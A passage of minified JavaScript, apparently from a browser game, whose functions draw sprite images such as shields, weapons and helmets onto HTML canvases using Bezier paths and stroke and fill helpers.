                    r.bezierCurveTo(305 * e, 44 * e, 307 * e, 51 * e, 311 * e, 64 * e),
                    r.bezierCurveTo(270.5 * e, 129.5 * e, 270.5 * e, 129.5 * e, 230 * e, 195 * e),
                    r.bezierCurveTo(221 * e, 175 * e, 203 * e, 171 * e, 186 * e, 172 * e),
                    r.closePath(),
                    he(r, t[3], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(292 * e, 198 * e),
                    r.bezierCurveTo(328 * e, 191 * e, 364 * e, 211 * e, 401 * e, 237 * e),
                    he(r, t[2], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(245 * e, 68 * e),
                    r.bezierCurveTo(210 * e, 72 * e, 210 * e, 72 * e, 189 * e, 69 * e),
                    he(r, t[2], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(222 * e, 96 * e),
                    r.bezierCurveTo(196 * e, 97 * e, 193 * e, 97 * e, 177 * e, 92 * e),
                    he(r, t[2], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(207 * e, 124 * e),
                    r.bezierCurveTo(179 * e, 123 * e, 177 * e, 124 * e, 161 * e, 119 * e),
                    he(r, t[2], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115 * e, 183 * e),
                    r.bezierCurveTo(184 * e, 185 * e, 203 * e, 198 * e, 219 * e, 221 * e),
                    he(r, t[2], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(98 * e, 213 * e),
                    r.bezierCurveTo(161 * e, 214 * e, 193 * e, 227 * e, 201 * e, 249 * e),
                    he(r, t[2], t[3], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(399 * e, 257 * e),
                    r.bezierCurveTo(287 * e, 215 * e, 280 * e, 215 * e, 263 * e, 222 * e),
                    r.bezierCurveTo(253 * e, 238 * e, 247 * e, 245 * e, 243 * e, 254 * e),
                    r.bezierCurveTo(267 * e, 236 * e, 292 * e, 263 * e, 377 * e, 284 * e),
                    he(r, t[3], t[3], 12 * e),
                    n
            }
            function P0(e, t, i, n) {
                var r = document.createElement("canvas")
                    , o = r.getContext("2d");
                return r.width = 170 * e,
                    r.height = 200 * e,
                    o.translate(5 * e, 15 * e),
                    1 == n && (o.translate(0, -5 * e),
                        ke(o, 77.00003051757812 * e, 104.49432373046875 * e, 71.84010022264724 * e),
                        he(o, i[1], i[5], 20 * e),
                        ke(o, 77.00003051757812 * e, 104.22160339355469 * e, 61.554853586049575 * e),
                        he(o, i[1], i[5], 20 * e),
                        o.save(),
                        o.translate(77.00003051757812 * e, 31.267044067382812 * e),
                        Ve(o, -6 * e, -12.5 * e, 12 * e, 25 * e, 10 * e),
                        o.restore(),
                        he(o, i[1], i[5], 20 * e),
                        o.save(),
                        o.translate(77.00003051757812 * e, 13.267044067382812 * e),
                        Ve(o, -15 * e, -10.5 * e, 30 * e, 21 * e, 10 * e),
                        o.restore(),
                        he(o, i[1], i[5], 20 * e)),
                    ke(o, 77.00003051757812 * e, 104.49432373046875 * e, 71.84010022264724 * e),
                    he(o, i[1], i[2], 7 * e),
                    ke(o, 77.00003051757812 * e, 104.22160339355469 * e, 61.554853586049575 * e),
                    he(o, i[1], i[2], 7 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(18.000030517578125 * e, 105.85795593261719 * e),
                    o.bezierCurveTo(134.00003051757812 * e, 104.85795593261719 * e, 77.00003051757812 * e, 104.85795593261719 * e, 136.00003051757812 * e, 103.85795593261719 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 8 * e),
                    ke(o, 77.00003051757812 * e, 104.6761474609375 * e, 32.55764119219941 * e),
                    he(o, i[1], i[2], 8 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(78.00003051757812 * e, 112.03977966308594 * e),
                    o.bezierCurveTo(78.00003051757812 * e, 87.03977966308594 * e, 78.00003051757812 * e, 87.03977966308594 * e, 78.00003051757812 * e, 62.03977966308594 * e),
                    o.closePath(),
                    he(o, i[3], i[2], 8 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(78.00003051757812 * e, 48.03977966308594 * e),
                    o.bezierCurveTo(82.00003051757812 * e, 55.53977966308594 * e, 82.00003051757812 * e, 55.53977966308594 * e, 86.00003051757812 * e, 63.03977966308594 * e),
                    o.bezierCurveTo(78.00003051757812 * e, 63.03977966308594 * e, 78.00003051757812 * e, 63.03977966308594 * e, 70.00003051757812 * e, 63.03977966308594 * e),
                    o.closePath(),
                    he(o, i[3], i[2], 4 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(80.00003051757812 * e, 111.6761474609375 * e),
                    o.bezierCurveTo(95.00003051757812 * e, 97.1761474609375 * e, 95.00003051757812 * e, 97.1761474609375 * e, 110.00003051757812 * e, 82.6761474609375 * e),
                    o.closePath(),
                    he(o, i[3], i[2], 8 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(107.00003051757812 * e, 76.6761474609375 * e),
                    o.bezierCurveTo(111.50003051757812 * e, 82.6761474609375 * e, 111.50003051757812 * e, 82.6761474609375 * e, 116.00003051757812 * e, 88.6761474609375 * e),
                    o.bezierCurveTo(118.50003051757812 * e, 81.6761474609375 * e, 118.50003051757812 * e, 81.6761474609375 * e, 121.00003051757812 * e, 74.6761474609375 * e),
                    o.closePath(),
                    he(o, i[3], i[2], 4 * e),
                    ke(o, 77.00003051757812 * e, 105.03977966308594 * e, 15.556349186104045 * e),
                    he(o, i[3], i[2], 4 * e),
                    o.save(),
                    o.translate(77.00003051757812 * e, 31.267044067382812 * e),
                    o.rotate(0),
                    Ve(o, -6 * e, -12.5 * e, 12 * e, 25 * e, 10 * e),
                    o.restore(),
                    he(o, i[1], i[2], 7 * e),
                    o.save(),
                    o.translate(77.00003051757812 * e, 13.267044067382812 * e),
                    o.rotate(0),
                    Ve(o, -15 * e, -10.5 * e, 30 * e, 21 * e, 10 * e),
                    o.restore(),
                    he(o, i[1], i[2], 7 * e),
                    r
            }
            function z0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 81 * e,
                    n.height = 77 * e,
                    r.translate(0, 10 * e),
                    r.scale(.2, .2),
                    r.translate(0, -30 * e),
                    1 == i && (r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(36.5 * e, 278.0625 * e),
                        r.bezierCurveTo(67.5 * e, 316.0625 * e, 134.5 * e, 334.0625 * e, 199.5 * e, 319.0625 * e),
                        r.bezierCurveTo(254.5 * e, 304.0625 * e, 346.5 * e, 270.0625 * e, 348.5 * e, 237.0625 * e),
                        r.bezierCurveTo(359.5 * e, 206.0625 * e, 318.5 * e, 129.0625 * e, 262.5 * e, 122.0625 * e),
                        r.bezierCurveTo(213.5 * e, 115.0625 * e, 166.5 * e, 133.0625 * e, 104.5 * e, 166.0625 * e),
                        r.bezierCurveTo(54.5 * e, 194.0625 * e, 23.5 * e, 241.0625 * e, 36.5 * e, 277.0625 * e),
                        r.closePath(),
                        he(r, t[0], t[3], 50 * e)),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36.5 * e, 278.0625 * e),
                    r.bezierCurveTo(67.5 * e, 316.0625 * e, 134.5 * e, 334.0625 * e, 199.5 * e, 319.0625 * e),
                    r.bezierCurveTo(254.5 * e, 304.0625 * e, 346.5 * e, 270.0625 * e, 348.5 * e, 237.0625 * e),
                    r.bezierCurveTo(359.5 * e, 206.0625 * e, 318.5 * e, 129.0625 * e, 262.5 * e, 122.0625 * e),
                    r.bezierCurveTo(213.5 * e, 115.0625 * e, 166.5 * e, 133.0625 * e, 104.5 * e, 166.0625 * e),
                    r.bezierCurveTo(54.5 * e, 194.0625 * e, 23.5 * e, 241.0625 * e, 36.5 * e, 277.0625 * e),
                    r.closePath(),
                    he(r, t[0], t[1], 19 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(214.5 * e, 124.0625 * e),
                    r.bezierCurveTo(242.5 * e, 125.0625 * e, 272.5 * e, 159.0625 * e, 283.5 * e, 184.0625 * e),
                    r.bezierCurveTo(277.5 * e, 161.0625 * e, 233.5 * e, 128.0625 * e, 219.5 * e, 122.0625 * e),
                    r.closePath(),
                    he(r, t[0], t[1], 19 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(157.5 * e, 145.0625 * e),
                    r.bezierCurveTo(176.5 * e, 148.0625 * e, 205.5 * e, 176.0625 * e, 212.5 * e, 197.0625 * e),
                    r.bezierCurveTo(205.5 * e, 178.0625 * e, 177.5 * e, 152.0625 * e, 156.5 * e, 142.0625 * e),
                    r.closePath(),
                    he(r, t[0], t[1], 19 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(103.5 * e, 169.0625 * e),
                    r.bezierCurveTo(160.5 * e, 166.0625 * e, 228.5 * e, 312.0625 * e, 162.5 * e, 323.0625 * e),
                    r.bezierCurveTo(128.5 * e, 330.0625 * e, 45.5 * e, 312.0625 * e, 34.5 * e, 268.0625 * e),
                    r.bezierCurveTo(30.5 * e, 238.0625 * e, 44.5 * e, 222.0625 * e, 52.5 * e, 211.0625 * e),
                    r.bezierCurveTo(82.5 * e, 174.0625 * e, 104.5 * e, 166.0625 * e, 119.5 * e, 172.0625 * e),
                    r.closePath(),
                    he(r, t[2], t[1], 19 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(194.5 * e, 313.0625 * e),
                    r.bezierCurveTo(222.5 * e, 306.0625 * e, 319.5 * e, 271.0625 * e, 337.5 * e, 241.0625 * e),
                    r.bezierCurveTo(274.5 * e, 270.0625 * e, 216.5 * e, 288.0625 * e, 199.5 * e, 287.0625 * e),
                    r.bezierCurveTo(198.5 * e, 302.0625 * e, 195.5 * e, 311.0625 * e, 193.5 * e, 312.0625 * e),
                    r.closePath(),
                    he(r, t[1]),
                    r.scale(3, 3),
                    r.translate(15, 10 * e),
                    1 == i && (r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(4 * e, 32 * e),
                        r.bezierCurveTo(19 * e, 25 * e, 19 * e, 25 * e, 34 * e, 18 * e),
                        r.bezierCurveTo(41.5 * e, 23.5 * e, 41.5 * e, 23.5 * e, 49 * e, 29 * e),
                        r.bezierCurveTo(59.5 * e, 20 * e, 59.5 * e, 20 * e, 70 * e, 11 * e),
                        he(r, void 0, t[3], 28 * e),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(56 * e, 6 * e),
                        r.bezierCurveTo(63.5 * e, 13.5 * e, 63.5 * e, 13.5 * e, 71 * e, 21 * e),
                        r.bezierCurveTo(74.5 * e, 11.5 * e, 74.5 * e, 11.5 * e, 78 * e, 2 * e),
                        r.closePath(),
                        he(r, t[3], t[3], 28 * e)),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(4 * e, 32 * e),
                    r.bezierCurveTo(19 * e, 25 * e, 19 * e, 25 * e, 34 * e, 18 * e),
                    r.bezierCurveTo(41.5 * e, 23.5 * e, 41.5 * e, 23.5 * e, 49 * e, 29 * e),
                    r.bezierCurveTo(59.5 * e, 20 * e, 59.5 * e, 20 * e, 70 * e, 11 * e),
                    he(r, void 0, t[1], 17 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(56 * e, 6 * e),
                    r.bezierCurveTo(63.5 * e, 13.5 * e, 63.5 * e, 13.5 * e, 71 * e, 21 * e),
                    r.bezierCurveTo(74.5 * e, 11.5 * e, 74.5 * e, 11.5 * e, 78 * e, 2 * e),
                    r.closePath(),
                    he(r, t[1], t[1], 17 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(4 * e, 32 * e),
                    r.bezierCurveTo(19 * e, 25 * e, 19 * e, 25 * e, 34 * e, 18 * e),
                    r.bezierCurveTo(41.5 * e, 23.5 * e, 41.5 * e, 23.5 * e, 49 * e, 29 * e),
                    r.bezierCurveTo(59.5 * e, 20 * e, 59.5 * e, 20 * e, 70 * e, 11 * e),
                    he(r, void 0, t[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(56 * e, 6 * e),
                    r.bezierCurveTo(63.5 * e, 13.5 * e, 63.5 * e, 13.5 * e, 71 * e, 21 * e),
                    r.bezierCurveTo(74.5 * e, 11.5 * e, 74.5 * e, 11.5 * e, 78 * e, 2 * e),
                    r.closePath(),
                    he(r, t[2], t[2], 10 * e),
                    n
            }
            function B0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 144 * e,
                    n.height = 280 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(62 * e, 103.79999542236328 * e),
                    r.bezierCurveTo(62.5 * e, 148.79999542236328 * e, 62.5 * e, 148.79999542236328 * e, 63 * e, 193.79999542236328 * e),
                    r.bezierCurveTo(63 * e, 219.79999542236328 * e, 47 * e, 217.79999542236328 * e, 51 * e, 230.79999542236328 * e),
                    r.bezierCurveTo(62 * e, 255.79999542236328 * e, 74 * e, 260.7999954223633 * e, 72 * e, 248.79999542236328 * e),
                    r.bezierCurveTo(65 * e, 226.79999542236328 * e, 71 * e, 229.79999542236328 * e, 76 * e, 225.79999542236328 * e),
                    r.bezierCurveTo(90 * e, 224.79999542236328 * e, 89 * e, 232.79999542236328 * e, 90 * e, 243.79999542236328 * e),
                    r.bezierCurveTo(95 * e, 253.79999542236328 * e, 99 * e, 249.79999542236328 * e, 100 * e, 229.79999542236328 * e),
                    r.bezierCurveTo(102 * e, 213.79999542236328 * e, 98 * e, 214.79999542236328 * e, 90 * e, 205.79999542236328 * e),
                    r.bezierCurveTo(82 * e, 201.79999542236328 * e, 82 * e, 185.79999542236328 * e, 82 * e, 114.79999542236328 * e),
                    r.bezierCurveTo(80 * e, 73 * e, 82 * e, 68 * e, 93 * e, 53 * e),
                    r.bezierCurveTo(98 * e, 37 * e, 65 * e, 14 * e, 74 * e, 33 * e),
                    r.bezierCurveTo(82 * e, 56 * e, 77 * e, 52 * e, 69 * e, 54 * e),
                    r.bezierCurveTo(55 * e, 57 * e, 57 * e, 53 * e, 54 * e, 39 * e),
                    r.bezierCurveTo(46 * e, 20 * e, 37 * e, 61 * e, 50 * e, 68 * e),
                    r.bezierCurveTo(65 * e, 81 * e, 60 * e, 89 * e, 62 * e, 102 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(62 * e, 103.79999542236328 * e),
                    r.bezierCurveTo(62.5 * e, 148.79999542236328 * e, 62.5 * e, 148.79999542236328 * e, 63 * e, 193.79999542236328 * e),
                    r.bezierCurveTo(63 * e, 219.79999542236328 * e, 47 * e, 217.79999542236328 * e, 51 * e, 230.79999542236328 * e),
                    r.bezierCurveTo(62 * e, 255.79999542236328 * e, 74 * e, 260.7999954223633 * e, 72 * e, 248.79999542236328 * e),
                    r.bezierCurveTo(65 * e, 226.79999542236328 * e, 71 * e, 229.79999542236328 * e, 76 * e, 225.79999542236328 * e),
                    r.bezierCurveTo(90 * e, 224.79999542236328 * e, 89 * e, 232.79999542236328 * e, 90 * e, 243.79999542236328 * e),
                    r.bezierCurveTo(95 * e, 253.79999542236328 * e, 99 * e, 249.79999542236328 * e, 100 * e, 229.79999542236328 * e),
                    r.bezierCurveTo(102 * e, 213.79999542236328 * e, 98 * e, 214.79999542236328 * e, 90 * e, 205.79999542236328 * e),
                    r.bezierCurveTo(82 * e, 201.79999542236328 * e, 82 * e, 185.79999542236328 * e, 82 * e, 114.79999542236328 * e),
                    r.bezierCurveTo(80 * e, 73 * e, 82 * e, 68 * e, 93 * e, 53 * e),
                    r.bezierCurveTo(98 * e, 37 * e, 65 * e, 14 * e, 74 * e, 33 * e),
                    r.bezierCurveTo(82 * e, 56 * e, 77 * e, 52 * e, 69 * e, 54 * e),
                    r.bezierCurveTo(55 * e, 57 * e, 57 * e, 53 * e, 54 * e, 39 * e),
                    r.bezierCurveTo(46 * e, 20 * e, 37 * e, 61 * e, 50 * e, 68 * e),
                    r.bezierCurveTo(65 * e, 81 * e, 60 * e, 89 * e, 62 * e, 102 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 6 * e),
                    n
            }
            function w0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 160 * e,
                    n.height = 161 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 10 * e),
                    r.save(),
                    r.translate(80.5 * e, 78 * e),
                    Ve(r, -71.5 * e, -71 * e, 143 * e, 143 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.save(),
                    r.translate(80.5 * e, 78 * e),
                    Ve(r, -71.5 * e, -71 * e, 143 * e, 143 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 6 * e),
                    r.save(),
                    r.translate(80 * e, 78.5 * e),
                    Ve(r, -17 * e, -72.5 * e, 34 * e, 145 * e, 10 * e),
                    r.restore(),
                    he(r, i[3], i[4], 6 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 10 * e),
                    r.save(),
                    r.translate(80 * e, 79.5 * e),
                    Ve(r, -73 * e, -16.5 * e, 145 * e, 34 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.save(),
                    r.translate(80 * e, 79.5 * e),
                    Ve(r, -73 * e, -16.5 * e, 145 * e, 34 * e, 10 * e),
                    r.restore(),
                    he(r, i[3], i[4], 6 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(79 * e, 71 * e),
                    r.bezierCurveTo(90 * e, 42 * e, 98 * e, 36 * e, 109 * e, 43 * e),
                    r.bezierCurveTo(119 * e, 47 * e, 128 * e, 62 * e, 107 * e, 72 * e),
                    r.bezierCurveTo(96 * e, 78.5 * e, 96 * e, 78.5 * e, 85 * e, 85 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(84 * e, 78 * e),
                    r.bezierCurveTo(113 * e, 82 * e, 123 * e, 97 * e, 115 * e, 108 * e),
                    r.bezierCurveTo(110 * e, 119 * e, 98 * e, 124 * e, 87 * e, 107 * e),
                    r.bezierCurveTo(81.5 * e, 94.5 * e, 81.5 * e, 94.5 * e, 76 * e, 82 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(80 * e, 73 * e),
                    r.bezierCurveTo(64 * e, 37 * e, 55 * e, 34 * e, 45 * e, 42 * e),
                    r.bezierCurveTo(30 * e, 54 * e, 36 * e, 65 * e, 51 * e, 72 * e),
                    r.bezierCurveTo(62.5 * e, 77 * e, 62.5 * e, 77 * e, 74 * e, 82 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(82 * e, 83 * e),
                    r.bezierCurveTo(73 * e, 107 * e, 60 * e, 123 * e, 47 * e, 113 * e),
                    r.bezierCurveTo(33 * e, 105 * e, 33 * e, 92 * e, 52 * e, 85 * e),
                    r.bezierCurveTo(74 * e, 73 * e, 77 * e, 76 * e, 76 * e, 75 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(79 * e, 71 * e),
                    r.bezierCurveTo(90 * e, 42 * e, 98 * e, 36 * e, 109 * e, 43 * e),
                    r.bezierCurveTo(119 * e, 47 * e, 128 * e, 62 * e, 107 * e, 72 * e),
                    r.bezierCurveTo(96 * e, 78.5 * e, 96 * e, 78.5 * e, 85 * e, 85 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(84 * e, 78 * e),
                    r.bezierCurveTo(113 * e, 82 * e, 123 * e, 97 * e, 115 * e, 108 * e),
                    r.bezierCurveTo(110 * e, 119 * e, 98 * e, 124 * e, 87 * e, 107 * e),
                    r.bezierCurveTo(81.5 * e, 94.5 * e, 81.5 * e, 94.5 * e, 76 * e, 82 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(80 * e, 73 * e),
                    r.bezierCurveTo(64 * e, 37 * e, 55 * e, 34 * e, 45 * e, 42 * e),
                    r.bezierCurveTo(30 * e, 54 * e, 36 * e, 65 * e, 51 * e, 72 * e),
                    r.bezierCurveTo(62.5 * e, 77 * e, 62.5 * e, 77 * e, 74 * e, 82 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(82 * e, 83 * e),
                    r.bezierCurveTo(73 * e, 107 * e, 60 * e, 123 * e, 47 * e, 113 * e),
                    r.bezierCurveTo(33 * e, 105 * e, 33 * e, 92 * e, 52 * e, 85 * e),
                    r.bezierCurveTo(74 * e, 73 * e, 77 * e, 76 * e, 76 * e, 75 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 6 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 10 * e),
                    r.save(),
                    r.translate(78.5 * e, 78 * e),
                    Ve(r, -13.5 * e, -14 * e, 27 * e, 27 * e, 6 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.save(),
                    r.translate(78.5 * e, 78 * e),
                    Ve(r, -13.5 * e, -14 * e, 27 * e, 27 * e, 6 * e),
                    r.restore(),
                    he(r, i[3], i[4], 6 * e),
                    n
            }
            function W0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 372 * e,
                    n.height = 358 * e,
                    r.translate(0 * e, 10 * e),
                    r.globalAlpha = t ? .2 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(247.00003051757812 * e, 115.76704406738281 * e),
                    r.bezierCurveTo(305.0000305175781 * e, 124.76704406738281 * e, 335.0000305175781 * e, 112.76704406738281 * e, 359.0000305175781 * e, 93.76704406738281 * e),
                    r.bezierCurveTo(359.5000305175781 * e, 113.26704406738281 * e, 359.5000305175781 * e, 113.26704406738281 * e, 360.0000305175781 * e, 132.7670440673828 * e),
                    r.bezierCurveTo(339.0000305175781 * e, 177.7670440673828 * e, 281.0000305175781 * e, 178.7670440673828 * e, 243.00003051757812 * e, 183.7670440673828 * e),
                    r.bezierCurveTo(214.50003051757812 * e, 214.2670440673828 * e, 214.50003051757812 * e, 214.2670440673828 * e, 186.00003051757812 * e, 244.7670440673828 * e),
                    r.bezierCurveTo(155.00003051757812 * e, 214.2670440673828 * e, 155.00003051757812 * e, 214.2670440673828 * e, 124.00003051757812 * e, 183.7670440673828 * e),
                    r.bezierCurveTo(51.000030517578125 * e, 180.7670440673828 * e, 21.000030517578125 * e, 161.7670440673828 * e, 9.000030517578125 * e, 129.7670440673828 * e),
                    r.bezierCurveTo(8.500030517578125 * e, 110.76704406738281 * e, 8.500030517578125 * e, 110.76704406738281 * e, 8.000030517578125 * e, 91.76704406738281 * e),
                    r.bezierCurveTo(31.000030517578125 * e, 112.76704406738281 * e, 87.00003051757812 * e, 119.76704406738281 * e, 116.00003051757812 * e, 117.76704406738281 * e),
                    r.bezierCurveTo(175.00003051757812 * e, 18.767044067382812 * e, 170.00003051757812 * e, 23.767044067382812 * e, 181.00003051757812 * e, 14.767044067382812 * e),
                    r.bezierCurveTo(199.00003051757812 * e, 34.76704406738281 * e, 203.00003051757812 * e, 54.76704406738281 * e, 247.00003051757812 * e, 115.76704406738281 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 10 * e),
                    r.translate(0 * e, -10 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(107.00003051757812 * e, 54.13069152832031 * e),
                    r.bezierCurveTo(106.50003051757812 * e, 38.63069152832031 * e, 106.50003051757812 * e, 38.63069152832031 * e, 106.00003051757812 * e, 23.130691528320312 * e),
                    r.bezierCurveTo(121.50003051757812 * e, 38.13069152832031 * e, 121.50003051757812 * e, 38.13069152832031 * e, 137.00003051757812 * e, 53.13069152832031 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(233.00003051757812 * e, 53.6761474609375 * e),
                    r.bezierCurveTo(247.00003051757812 * e, 37.1761474609375 * e, 247.00003051757812 * e, 37.1761474609375 * e, 261.0000305175781 * e, 20.6761474609375 * e),
                    r.bezierCurveTo(261.0000305175781 * e, 36.1761474609375 * e, 261.0000305175781 * e, 36.1761474609375 * e, 261.0000305175781 * e, 51.6761474609375 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(293.0000305175781 * e, 54.403411865234375 * e),
                    r.bezierCurveTo(300.0000305175781 * e, 49.903411865234375 * e, 300.0000305175781 * e, 49.903411865234375 * e, 307.0000305175781 * e, 45.403411865234375 * e),
                    r.bezierCurveTo(307.0000305175781 * e, 49.903411865234375 * e, 307.0000305175781 * e, 49.903411865234375 * e, 307.0000305175781 * e, 54.403411865234375 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(77.00003051757812 * e, 54.403411865234375 * e),
                    r.bezierCurveTo(70.00003051757812 * e, 50.403411865234375 * e, 70.00003051757812 * e, 50.403411865234375 * e, 63.000030517578125 * e, 46.403411865234375 * e),
                    r.bezierCurveTo(62.500030517578125 * e, 50.903411865234375 * e, 62.500030517578125 * e, 50.903411865234375 * e, 62.000030517578125 * e, 55.403411865234375 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(58.000030517578125 * e, 122.3125 * e),
                    r.bezierCurveTo(59.500030517578125 * e, 97.3125 * e, 59.500030517578125 * e, 97.3125 * e, 61.000030517578125 * e, 72.3125 * e),
                    r.bezierCurveTo(91.00003051757812 * e, 89.3125 * e, 91.00003051757812 * e, 89.3125 * e, 121.00003051757812 * e, 106.3125 * e),
                    r.closePath(),
                    he(r, i[1], i[1], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(310.0000305175781 * e, 127.3125 * e),
                    r.bezierCurveTo(308.0000305175781 * e, 98.3125 * e, 308.0000305175781 * e, 98.3125 * e, 306.0000305175781 * e, 69.3125 * e),
                    r.bezierCurveTo(274.5000305175781 * e, 88.8125 * e, 274.5000305175781 * e, 88.8125 * e, 243.00003051757812 * e, 108.3125 * e),
                    r.closePath(),
                    he(r, i[1], i[1], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(226.00003051757812 * e, 87.85795593261719 * e),
                    r.bezierCurveTo(243.50003051757812 * e, 66.85795593261719 * e, 243.50003051757812 * e, 66.85795593261719 * e, 261.0000305175781 * e, 45.85795593261719 * e),
                    r.bezierCurveTo(265.0000305175781 * e, 83.85795593261719 * e, 265.0000305175781 * e, 83.85795593261719 * e, 269.0000305175781 * e, 121.85795593261719 * e),
                    r.bezierCurveTo(235.00003051757812 * e, 122.85795593261719 * e, 233.00003051757812 * e, 107.85795593261719 * e, 228.00003051757812 * e, 90.85795593261719 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105.00003051757812 * e, 128.8579559326172 * e),
                    r.bezierCurveTo(104.50003051757812 * e, 87.85795593261719 * e, 104.50003051757812 * e, 87.85795593261719 * e, 104.00003051757812 * e, 46.85795593261719 * e),
                    r.bezierCurveTo(126.50003051757812 * e, 69.35795593261719 * e, 126.50003051757812 * e, 69.35795593261719 * e, 149.00003051757812 * e, 91.85795593261719 * e),
                    r.bezierCurveTo(130.00003051757812 * e, 123.85795593261719 * e, 123.00003051757812 * e, 132.8579559326172 * e, 107.00003051757812 * e, 130.8579559326172 * e),
                    r.closePath(),
                    he(r, i[1], i[1], 10 * e),
